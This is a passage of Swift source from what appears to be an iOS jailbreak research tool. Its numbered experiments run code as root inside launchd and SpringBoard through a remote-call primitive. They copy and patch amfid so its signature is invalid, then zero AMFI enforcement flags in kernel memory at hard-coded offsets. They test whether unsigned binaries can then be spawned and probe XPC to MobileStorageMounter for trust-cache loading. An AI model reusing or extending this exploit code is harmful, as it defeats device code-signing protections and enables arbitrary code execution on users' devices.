        // B) Copy again but patch 1 byte → unsigned (different CDHash)
        let srcFd2 = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        let dstFd2 = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        var totalCopied2: UInt64 = 0
        for _ in 0..<256 {
            let n = RootExecutor.rcall(rc, "read", srcFd2, buf, 4096)
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd2, buf, n)
            totalCopied2 += n
            if n < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd2)
        RootExecutor.rcall(rc, "close", dstFd2)

        // Patch byte to invalidate CDHash
        let patchFd = RootExecutor.rcall(rc, "open", unsignedDstAddr, UInt64(O_RDWR), 0)
        if patchFd != UInt64(bitPattern: -1) {
            // Patch at offset 0x100 (well into __TEXT, will change CDHash)
            RootExecutor.rcall(rc, "lseek", patchFd, 0x100, 0)
            rc[buf].setValue8(0xFF)
            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
            RootExecutor.rcall(rc, "close", patchFd)
        }
        RootExecutor.rcall(rc, "chmod", unsignedDstAddr, 0o755)
        detail += "Copied + patched → \(unsignedDst) (\(totalCopied2) bytes, CDHash INVALID)\n\n"

        // ============================================================
        // Step 2: posix_spawn tests — FLAGS ON (baseline)
        // ============================================================
        detail += "=== Step 2: posix_spawn baseline (flags ON) ===\n\n"

        // Test A: spawn trusted copy
        let (retA, pidA, errA) = doSpawn(rc: rc, path: trustedDst, mem: mem)
        detail += "[A] posix_spawn(\(trustedDst)):\n"
        detail += "    ret=\(retA), pid=\(pidA), errno=\(errA)\n"
        if retA == 0 && pidA != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidA, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test B: spawn unsigned copy
        let (retB, pidB, errB) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
        detail += "[B] posix_spawn(\(unsignedDst)):\n"
        detail += "    ret=\(retB), pid=\(pidB), errno=\(errB)\n"
        if retB == 0 && pidB != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidB, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test C: spawn original amfid path
        let (retC, pidC, errC) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
        detail += "[C] posix_spawn(\(trustedSrc)):\n"
        detail += "    ret=\(retC), pid=\(pidC), errno=\(errC)\n"
        if retC == 0 && pidC != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidC, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 3: Disable AMFI flags
        // ============================================================
        detail += "=== Step 3: Disable AMFI flags ===\n"
        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }
        detail += "All 10 flags set to 0\n\n"

        // ============================================================
        // Step 4: posix_spawn tests — FLAGS OFF
        // ============================================================
        detail += "=== Step 4: posix_spawn (flags OFF) ===\n\n"

        // Test D: spawn trusted copy (flags off)
        let (retD, pidD, errD) = doSpawn(rc: rc, path: trustedDst, mem: mem)
        detail += "[D] posix_spawn(\(trustedDst), flags OFF):\n"
        detail += "    ret=\(retD), pid=\(pidD), errno=\(errD)\n"
        if retD == 0 && pidD != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidD, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // Test E: spawn UNSIGNED copy (flags off) — THE KEY TEST
        let (retE, pidE, errE) = doSpawn(rc: rc, path: unsignedDst, mem: mem)
        detail += "[E] posix_spawn(\(unsignedDst), flags OFF):\n"
        detail += "    ret=\(retE), pid=\(pidE), errno=\(errE)\n"
        var unsignedExecOK = false
        if retE == 0 && pidE != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidE, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
            if sig != 9 { unsignedExecOK = true }
        }
        detail += "\n"

        // Test F: spawn original path (flags off)
        let (retF, pidF, errF) = doSpawn(rc: rc, path: trustedSrc, mem: mem)
        detail += "[F] posix_spawn(\(trustedSrc), flags OFF):\n"
        detail += "    ret=\(retF), pid=\(pidF), errno=\(errF)\n"
        if retF == 0 && pidF != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidF, mem: mem)
            detail += "    exit: signal=\(sig), code=\(code)\n"
        }
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags
        // ============================================================
        detail += "=== Step 5: Restore flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "Restored\n\n"

        // Cleanup
        RootExecutor.rcall(rc, "unlink", trustedDstAddr)
        RootExecutor.rcall(rc, "unlink", unsignedDstAddr)
        RootExecutor.rcall(rc, "unlink", proofAddr)
        RootExecutor.rcall(rc, "free", srcAddr)
        RootExecutor.rcall(rc, "free", trustedDstAddr)
        RootExecutor.rcall(rc, "free", unsignedDstAddr)
        RootExecutor.rcall(rc, "free", proofAddr)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"
        detail += "Summary:\n"
        detail += "  Trusted copy (flags ON):  ret=\(retA)\n"
        detail += "  Unsigned copy (flags ON): ret=\(retB)\n"
        detail += "  Trusted copy (flags OFF): ret=\(retD)\n"
        detail += "  Unsigned copy (flags OFF): ret=\(retE)\n\n"

        if retB != 0 && retE == 0 && unsignedExecOK {
            detail += "🎉🎉🎉 JAILBREAK CONFIRMED! 🎉🎉🎉\n\n"
            detail += "Unsigned binary BLOCKED with flags ON (ret=\(retB))\n"
            detail += "Unsigned binary ALLOWED with flags OFF (ret=\(retE))!\n"
            detail += "AMFI flags control code signing enforcement!\n"
        } else if retA != 0 && retD == 0 {
            detail += "⚠️ Flags affect trusted binary spawn too.\n"
            detail += "posix_spawn fails for ALL binaries in /var/tmp (flags ON)\n"
            detail += "but works with flags OFF. Flags control spawn permission.\n"
            if retE == 0 {
                detail += "\n🎉 AND unsigned binary also works with flags OFF!\n"
            }
        } else if retA != 0 && retB != 0 && retD != 0 && retE != 0 {
            detail += "❌ posix_spawn fails for ALL cases.\n"
            detail += "ret=\(retA)/\(retB)/\(retD)/\(retE)\n"
            detail += "posix_spawn from launchd RC has a fundamental issue.\n"
            detail += "Might need posix_spawnattr or different approach.\n\n"
            detail += "NOTE: This doesn't mean AMFI blocks — posix_spawn\n"
            detail += "might fail for other reasons (sandbox, path, attrs).\n"
        } else if retA == 0 && retB == 0 {
            detail += "⚠️ BOTH trusted and unsigned work with flags ON!\n"
            detail += "AMFI doesn't block copied binaries from /var/tmp.\n"
            detail += "The CDHash patch might not actually change the hash\n"
            detail += "(patch at wrong offset?), OR launchd bypasses AMFI.\n"
        } else {
            detail += "Mixed results — need more analysis.\n"
            detail += "Trusted ON=\(retA), Unsigned ON=\(retB)\n"
            detail += "Trusted OFF=\(retD), Unsigned OFF=\(retE)\n"
        }

        return ExperimentResult(name: expName, success: (retE == 0 && retB != 0) || unsignedExecOK, detail: detail, timestamp: Date())
    }

    /// Helper: posix_spawn and return (ret, pid, errno)
    private func doSpawn(rc: RemoteCall, path: String, mem: UInt64) -> (Int64, UInt32, Int32) {
        let pathAddr = remote_alloc_str(rc, path)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(pathAddr)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x480
        rc[pidAddr].setValue32(0)

        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        let err = remote_errno(rc)

        RootExecutor.rcall(rc, "free", pathAddr)
        return (Int64(bitPattern: ret), pid, err)
    }

    /// Helper: waitpid and return (signal, exitcode)
    private func doWait(rc: RemoteCall, pid: UInt32, mem: UInt64) -> (Int32, Int32) {
        let statusAddr = mem + 0x490
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
        let st = rc[statusAddr].value32()
        return (Int32(st & 0x7F), Int32(st >> 8))
    }

    // MARK: - Exp 93g: Multi-Path + SpringBoard Spawn

    /// Exp 93g: posix_spawn fails from /var/tmp via launchd (EPERM).
    /// Test: 1) different paths, 2) SpringBoard RC, 3) symlink from trusted path
    private func runExp93gMultiSpawn() {
        isRunning = true
        runningLabel = "Multi Spawn"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93g_multi_spawn") { rc in
            let result = self.expMultiSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expMultiSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "Multi Spawn (Exp 93g)"
        var detail = "Experiment 93g: Multi-Path + SpringBoard Spawn\n"
        detail += "================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // ============================================================
        // Step 1: Copy amfid to multiple paths
        // ============================================================
        detail += "=== Step 1: Copy binary to various paths ===\n"

        let srcPath = "/usr/libexec/amfid"
        let testPaths = [
            "/var/tmp/.exp93g",
            "/var/root/.exp93g",
            "/var/mobile/.exp93g",
            "/var/containers/Bundle/.exp93g",
            "/private/var/tmp/.exp93g",
            "/tmp/.exp93g",
        ]

        let srcAddr = remote_alloc_str(rc, srcPath)
        let buf = mem + 0x800

        // Read source once into memory
        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(srcPath)\n"
            RootExecutor.rcall(rc, "free", srcAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        let fileSize = RootExecutor.rcall(rc, "lseek", srcFd, 0, 2)
        RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
        detail += "Source: \(srcPath) (\(fileSize) bytes)\n\n"

        var successPaths: [String] = []

        for path in testPaths {
            let dstAddr = remote_alloc_str(rc, path)
            RootExecutor.rcall(rc, "unlink", dstAddr)

            let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
            if dstFd == UInt64(bitPattern: -1) {
                detail += "  \(path): create FAIL ❌\n"
                RootExecutor.rcall(rc, "free", dstAddr)
                continue
            }

            // Copy from source (rewind source each time)
            RootExecutor.rcall(rc, "lseek", srcFd, 0, 0)
            var copied: UInt64 = 0
            for _ in 0..<256 {
                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
                if n == 0 || n == UInt64(bitPattern: -1) { break }
                RootExecutor.rcall(rc, "write", dstFd, buf, n)
                copied += n
                if n < 4096 { break }
            }
            RootExecutor.rcall(rc, "close", dstFd)
            RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)

            if copied > 0 {
                detail += "  \(path): copied ✅ (\(copied) bytes)\n"
                successPaths.append(path)
            } else {
                detail += "  \(path): copy failed ❌\n"
            }
            RootExecutor.rcall(rc, "free", dstAddr)
        }
        RootExecutor.rcall(rc, "close", srcFd)
        detail += "\n"

        // ============================================================
        // Step 2: posix_spawn from launchd — test all paths
        // ============================================================
        detail += "=== Step 2: posix_spawn from LAUNCHD ===\n\n"

        var launchdResults: [(path: String, ret: Int64, pid: UInt32)] = []

        for path in successPaths {
            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
            detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
            if ret == 0 && pid != 0 {
                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
                detail += ", signal=\(sig), code=\(code)"
                if sig == 9 { detail += " (SIGKILL)" }
            }
            detail += "\n"
            launchdResults.append((path, ret, pid))
        }

        // Also test original path
        let (retOrig, pidOrig, errOrig) = doSpawn(rc: rc, path: srcPath, mem: mem)
        detail += "  \(srcPath) (original):\n    ret=\(retOrig), pid=\(pidOrig), errno=\(errOrig)"
        if retOrig == 0 && pidOrig != 0 {
            let (sig, code) = doWait(rc: rc, pid: pidOrig, mem: mem)
            detail += ", signal=\(sig), code=\(code)"
        }
        detail += "\n\n"

        // ============================================================
        // Step 3: posix_spawn from SPRINGBOARD
        // ============================================================
        detail += "=== Step 3: posix_spawn from SPRINGBOARD ===\n\n"

        var sbResults: [(path: String, ret: Int64, pid: UInt32)] = []

        if let sb = dspmgr.shared.sbProc {
            let sbMem = sb.trojanMem

            for path in successPaths {
                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
                detail += "  \(path):\n    ret=\(ret), pid=\(pid), errno=\(err)"
                if ret == 0 && pid != 0 {
                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
                    detail += ", signal=\(sig), code=\(code)"
                    if sig == 9 { detail += " (SIGKILL)" }
                }
                detail += "\n"
                sbResults.append((path, ret, pid))
            }

            // Original path from SB
            let (retSBOrig, pidSBOrig, errSBOrig) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
            detail += "  \(srcPath) (original):\n    ret=\(retSBOrig), pid=\(pidSBOrig), errno=\(errSBOrig)"
            if retSBOrig == 0 && pidSBOrig != 0 {
                let (sig, code) = doWait(rc: sb, pid: pidSBOrig, mem: sbMem)
                detail += ", signal=\(sig), code=\(code)"
            }
            detail += "\n"
        } else {
            detail += "  ❌ No SpringBoard RC available\n"
        }
        detail += "\n"

        // ============================================================
        // Step 4: Disable AMFI flags + retry best path from SB
        // ============================================================
        detail += "=== Step 4: Disable AMFI flags + retry ===\n"

        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }
        detail += "Flags disabled: 10/10\n\n"

        // Retry from launchd
        detail += "--- Launchd (flags OFF) ---\n"
        for path in successPaths {
            let (ret, pid, err) = doSpawn(rc: rc, path: path, mem: mem)
            detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
            if ret == 0 && pid != 0 {
                let (sig, code) = doWait(rc: rc, pid: pid, mem: mem)
                detail += ", sig=\(sig), code=\(code)"
                if sig == 9 { detail += " SIGKILL" }
                else if sig == 0 { detail += " ✅ NO SIGKILL" }
            }
            detail += "\n"
        }
        detail += "\n"

        // Retry from SpringBoard
        var sbFlagsOffSuccess = false
        detail += "--- SpringBoard (flags OFF) ---\n"
        if let sb = dspmgr.shared.sbProc {
            let sbMem = sb.trojanMem
            for path in successPaths {
                let (ret, pid, err) = doSpawn(rc: sb, path: path, mem: sbMem)
                detail += "  \(path): ret=\(ret), pid=\(pid), errno=\(err)"
                if ret == 0 && pid != 0 {
                    let (sig, code) = doWait(rc: sb, pid: pid, mem: sbMem)
                    detail += ", sig=\(sig), code=\(code)"
                    if sig != 9 { sbFlagsOffSuccess = true; detail += " ✅ NO SIGKILL" }
                    if sig == 9 { detail += " SIGKILL" }
                }
                detail += "\n"
            }

            // Also try original from SB with flags off
            let (retF, pidF, errF) = doSpawn(rc: sb, path: srcPath, mem: sbMem)
            detail += "  \(srcPath): ret=\(retF), pid=\(pidF), errno=\(errF)"
            if retF == 0 && pidF != 0 {
                let (sig, code) = doWait(rc: sb, pid: pidF, mem: sbMem)
                detail += ", sig=\(sig), code=\(code)"
                if sig != 9 { sbFlagsOffSuccess = true }
            }
            detail += "\n"
        }
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags + cleanup
        // ============================================================
        detail += "=== Step 5: Restore + cleanup ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "Flags restored\n"

        // Cleanup files
        for path in successPaths {
            let addr = remote_alloc_str(rc, path)
            RootExecutor.rcall(rc, "unlink", addr)
            RootExecutor.rcall(rc, "free", addr)
        }
        RootExecutor.rcall(rc, "free", srcAddr)
        detail += "Files cleaned\n\n"

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let anyLaunchdWork = launchdResults.contains { $0.ret == 0 }
        let anySBWork = sbResults.contains { $0.ret == 0 }

        if sbFlagsOffSuccess {
            detail += "🎉 SpringBoard can spawn with AMFI flags OFF!\n"
            detail += "This might be the path to jailbreak.\n"
        } else if anySBWork {
            detail += "✅ SpringBoard can posix_spawn from some paths!\n"
            detail += "Next: test with UNSIGNED binary from SB.\n"
        } else if anyLaunchdWork {
            detail += "✅ Launchd can spawn from some paths.\n"
        } else {
            detail += "❌ posix_spawn fails from all tested paths.\n"
            detail += "Both launchd and SpringBoard blocked.\n\n"
            detail += "Remaining options:\n"
            detail += "  1. Use system() or popen() (resolves /bin/sh)\n"
            detail += "  2. Use NSTask/NSProcess from SB\n"
            detail += "  3. dlopen + function call (no new process)\n"
            detail += "  4. Patch amfid via kernel memory (physmap)\n"
        }

        return ExperimentResult(name: expName, success: anySBWork || sbFlagsOffSuccess, detail: detail, timestamp: Date())
    }


    // MARK: - Dead-end experiments 96-99 REMOVED
    // Exp 96: __DATA_CONST write � KTRR panic
    // Exp 97: amfid kill race � kernel enforces independently
    // Exp 98/98b: CoreTrust __DATA � writable tapi bukan enforcement
    // Exp 99: AMFI IOKit � no useful selectors found

    // MARK: - Exp 100: Trust Cache Load via XPC

    /// Exp 100: Trigger trust cache load via MobileStorageMounter/mobileassetd XPC.
    /// FIXED: Pakai SpringBoard RC (bukan launchd) — launchd crash karena
    /// dia XPC service manager, connect ke service sendiri = deadlock → initproc panic.
    /// SpringBoard aman karena dia client biasa, bukan service manager.
    private func runExp100TCLoadXPC() {
        isRunning = true
        runningLabel = "TC Load (SB)"
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(
                name: "TC Load XPC (Exp 100)", success: false,
                detail: "No SpringBoard RC — butuh SB RC untuk XPC (launchd = panic)", timestamp: Date()
            ), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTCLoadXPC(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    #if !DISABLE_REMOTECALL
    /// Exp 100 — pakai SpringBoard RC agar tidak crash launchd.
    /// Launchd = XPC service manager → connect ke service sendiri = deadlock/panic.
    /// SpringBoard = normal client → aman untuk XPC connections.
    private func expTCLoadXPC(sb: RemoteCall) -> ExperimentResult {
        let expName = "TC Load XPC (Exp 100)"
        var detail = "Experiment 100: Trust Cache Load via XPC (SpringBoard)\n"
        detail += "========================================================\n\n"
        detail += "⚠️ FIXED: Pakai SpringBoard RC (launchd = initproc panic)\n"
        detail += "Target: MobileStorageMounter & mobileassetd\n"
        detail += "Kedua punya entitlement pmap.load-trust-cache\n\n"

        let mem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)

        // Step 2: XPC connection ke MSM (minimal calls — avoid watchdog)
        detail += "=== XPC connection (minimal) ===\n"

        let xpcConnect = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcDictSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))

        detail += "xpc_dictionary_create: 0x\(String(format: "%llx", xpcDictCreate))\n"
        detail += "xpc_send_message: 0x\(String(format: "%llx", xpcSend))\n\n"

        guard xpcConnect != 0 && xpcResume != 0 && xpcDictCreate != 0 else {
            detail += "❌ XPC functions not available in SpringBoard\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        var anyConnected = false

        // HANYA test service yang berhasil connect (minimize RC calls = no watchdog)
        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcConnect, svcAddr, 0, 0)
        detail += "[com.apple.mobile.storage_mounter]:\n"
        detail += "  connection: 0x\(String(format: "%llx", conn))\n"
        RootExecutor.rcall(sb, "free", svcAddr)

        if conn != 0 {
            anyConnected = true
            RootExecutor.rcallAddr(sb, xpcResume, conn)

            // Create message: xpc_dictionary_create(NULL, NULL, 0)
            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
            detail += "  message: 0x\(String(format: "%llx", msg))\n"

            if msg != 0 && xpcDictSetStr != 0 {
                let keyCmd = remote_alloc_str(sb, "Command")
                let valCmd = remote_alloc_str(sb, "LookupImage")
                RootExecutor.rcallAddr(sb, xpcDictSetStr, msg, keyCmd, valCmd)

                // Fire-and-forget send (NO reply sync = no hang)
                if xpcSend != 0 {
                    RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
                    detail += "  Sent LookupImage command!\n"
                }
                RootExecutor.rcall(sb, "free", keyCmd)
                RootExecutor.rcall(sb, "free", valCmd)
            } else {
                detail += "  ❌ msg=NULL — xpc_dictionary_create failed\n"
            }
        } else {
            detail += "  FAILED to connect\n"
        }

        // Verdict
        detail += "\n=== VERDICT ===\n"
        detail += "Context: SpringBoard (minimal calls — no watchdog)\n"
        if anyConnected {
            detail += "✅ MSM connection berhasil!\n"
            detail += "Message format perlu di-reverse dari MSM binary.\n"
            detail += "Lihat Exp 105 untuk deep command probe.\n"
        } else {
            detail += "❌ Tidak bisa connect ke MSM dari SpringBoard.\n"
        }

        return ExperimentResult(name: expName, success: anyConnected, detail: detail, timestamp: Date())
    }
    #endif

    // MARK: - Exp 101–105: New experiments from reverse engineering findings

    private func runExp101CryptexdTOCTOU() { runSBExperiment(label: "TOCTOU", exp: expCryptexdTOCTOU) }
    private func runExp102XpcproxySandbox() { runSBExperiment(label: "SBX Ext", exp: expXpcproxySandbox) }
    private func runExp103InstalldDeserial() { runSBExperiment(label: "Deserial", exp: expInstalldDeserial) }
    private func runExp104LockdowndOverflow() { runSBExperiment(label: "Overflow", exp: expLockdowndOverflow) }
    private func runExp105MSMXPC() { runSBExperiment(label: "MSM XPC", exp: expMSMXPC) }
    private func runExp106SandboxExecSpawn() {
        isRunning = true
        runningLabel = "SBX Spawn"
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(name: "Sandbox Exec Spawn (Exp 106)", success: false,
                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        guard mgr.rcready else {
            results.insert(ExperimentResult(name: "Sandbox Exec Spawn (Exp 106)", success: false,
                detail: "No launchd RC (needed for file copy)", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expSandboxExecSpawn(sb: sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    /// Helper: run experiment via SpringBoard RC on background thread
    private func runSBExperiment(label: String, exp: @escaping (RemoteCall) -> ExperimentResult) {
        isRunning = true
        runningLabel = label
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            results.insert(ExperimentResult(name: label, success: false,
                detail: "No SpringBoard RC", timestamp: Date()), at: 0)
            isRunning = false; runningLabel = ""; return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = exp(sb)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false; self.runningLabel = ""
            }
        }
        #else
        isRunning = false; runningLabel = ""
        #endif
    }

    // MARK: - Exp 93c Helpers

    private struct SpawnResult {
        let success: Bool
        let log: String
        let exitCode: Int32
        let signal: Int32
        let stdout: String
    }

    /// posix_spawn with pipe to capture stdout
    private func spawnAndCapture(rc: RemoteCall, binaryPath: String, mem: UInt64) -> SpawnResult {
        var log = ""
        let binAddr = remote_alloc_str(rc, binaryPath)

        // Create pipe for stdout capture
        let pipeFds = mem + 0x600  // [read_fd, write_fd]
        rc[pipeFds].setValue32(0)
        rc[pipeFds + 4].setValue32(0)
        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)

        let readFd = Int32(bitPattern: rc[pipeFds].value32())
        let writeFd = Int32(bitPattern: rc[pipeFds + 4].value32())

        if pipeRet != 0 {
            log += "  pipe() failed, falling back to simple spawn\n"
            // Fallback: simple spawn without capture
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)

            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            log += "  posix_spawn: ret=\(ret), pid=\(pid)\n"

            if ret == 0 && pid != 0 {
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
                let st = rc[statusAddr].value32()
                let sig = Int32(st & 0x7F)
                let code = Int32(st >> 8)
                log += "  exit: signal=\(sig), code=\(code)\n"
                RootExecutor.rcall(rc, "free", binAddr)
                return SpawnResult(success: sig != 9 && sig == 0, log: log, exitCode: code, signal: sig, stdout: "")
            } else {
                let err = remote_errno(rc)
                log += "  FAILED: errno=\(err)\n"
                RootExecutor.rcall(rc, "free", binAddr)
                return SpawnResult(success: false, log: log, exitCode: -1, signal: -1, stdout: "")
            }
        }

        // Setup posix_spawn_file_actions to redirect stdout to pipe
        // posix_spawn_file_actions_t is opaque — size varies, allocate 128 bytes
        let fileActionsAddr = mem + 0x650
        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)

        if initRet == 0 {
            // dup2 write end of pipe to stdout (fd 1)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 1)
            // Also redirect stderr to pipe
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", fileActionsAddr, UInt64(Int64(writeFd)), 2)
            // Close read end in child
            RootExecutor.rcall(rc, "posix_spawn_file_actions_addclose", fileActionsAddr, UInt64(Int64(readFd)))
        }

        // argv = [binary, NULL]
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)

        // Spawn
        let pidAddr = mem + 0x480
        rc[pidAddr].setValue32(0)
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr,
                                          initRet == 0 ? fileActionsAddr : 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()

        log += "  posix_spawn: ret=\(spawnRet), pid=\(pid)\n"

        // Close write end in parent (so read gets EOF when child exits)
        RootExecutor.rcall(rc, "close", UInt64(Int64(writeFd)))

        var stdoutStr = ""
        if spawnRet == 0 && pid != 0 {
            // Read stdout from pipe (max 1024 bytes)
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", UInt64(Int64(readFd)), readBuf, 1024)
            if nread > 0 && nread < 1024 {
                // Read bytes from remote userspace memory via RC accessor
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<min(nread, 256) {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
                }
                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary data)"
                log += "  stdout (\(nread) bytes): \(stdoutStr.prefix(200))\n"
            } else if nread == 0 {
                log += "  stdout: (empty)\n"
            }

            // Wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)
            log += "  exit: signal=\(sig), code=\(code)\n"

            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
            RootExecutor.rcall(rc, "free", binAddr)

            let ok = (sig != 9 && sig == 0)
            if sig == 9 { log += "  ❌ SIGKILL by AMFI\n" }
            else if ok { log += "  ✅ SUCCESS\n" }
            return SpawnResult(success: ok, log: log, exitCode: code, signal: sig, stdout: stdoutStr)
        } else {
            let err = remote_errno(rc)
            log += "  FAILED: errno=\(err)\n"
            RootExecutor.rcall(rc, "close", UInt64(Int64(readFd)))
            if initRet == 0 { RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr) }
            RootExecutor.rcall(rc, "free", binAddr)
